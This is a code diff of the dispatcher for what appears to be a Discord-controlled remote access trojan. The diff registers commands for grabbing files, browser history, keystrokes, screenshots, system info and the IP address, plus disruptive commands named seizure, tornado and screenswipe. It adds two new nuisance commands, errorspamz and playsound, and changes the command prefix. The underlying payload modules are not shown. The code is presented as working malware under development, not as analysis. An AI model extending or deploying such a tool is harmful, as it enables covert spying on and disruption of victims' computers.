@@ -2,10 +2,10 @@ import discord
 from discord.ext import commands
 import discodd
 import info
-from command import ip_command, screenswipe_command, tornado_command, seizure_command, clean_command, lp_command, tree_command, getfiles_command, kp_command, getbrowserhistory_command, share_command, sysinfo_command, screenshot_command
+from command import ip_command, playsound_command, errorspamz_command, screenswipe_command, tornado_command, seizure_command, clean_command, lp_command, tree_command, getfiles_command, kp_command, getbrowserhistory_command, share_command, sysinfo_command, screenshot_command
 
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix='!', intents=intents)
+bot = commands.Bot(command_prefix='.', intents=intents)
 
 @bot.event
 async def on_ready():
@@ -41,5 +41,6 @@ bot.add_command(commands.Command(screenshot_command.screenshot, name='screenshot
 bot.add_command(commands.Command(seizure_command.seizure, name='seizure'))
 bot.add_command(commands.Command(tornado_command.tornado, name='tornado'))
 bot.add_command(commands.Command(screenswipe_command.screenswipe, name='screenswipe'))
-
+bot.add_command(commands.Command(errorspamz_command.errorspamz, name='errorspamz'))
+bot.add_command(commands.Command(playsound_command.playsound, name='playsound'))
 bot.run(discodd.TOKEN)
